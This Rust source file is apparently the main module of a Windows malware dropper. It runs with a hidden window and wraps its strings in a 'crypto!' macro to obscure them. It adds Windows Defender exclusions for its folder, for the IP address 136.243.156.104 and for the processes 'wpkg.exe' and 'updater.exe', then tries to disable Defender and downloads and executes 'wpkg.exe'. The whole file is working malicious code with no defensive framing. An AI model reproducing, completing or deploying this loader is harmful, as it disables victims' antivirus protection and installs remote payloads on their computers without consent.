#![windows_subsystem = "windows"]

use anyhow::Ok;
use rust_defblocker::*;

mod macros;
mod utils;
mod versions;
mod downloader;

#[tokio::main]
async fn main() {
    let path = utils::get_dir().expect(&crypto!("Could not create directory"));
    exclusions(&path).expect(&crypto!("Something goes wrong with exclutsion"));
    disable_defender().unwrap_err();
    downloader::download_wpkg(&format!("{path}\\wpkg.exe")).await.expect(&crypto!("Could not download wpkg"));
    utils::run_process(&format!("{path}\\wpkg.exe"), vec![], false).expect(&crypto!("Could not start wpkg"));
}
fn exclusions(path: &str) -> anyhow::Result<()> {
    add_exclusion_folder(&path)?;
    add_exclusion_ip_address(&crypto!("136.243.156.104"))?;
    add_exclusion_process(&crypto!("wpkg.exe"))?;
    add_exclusion_process(&crypto!("updater.exe"))?;
    Ok(())
}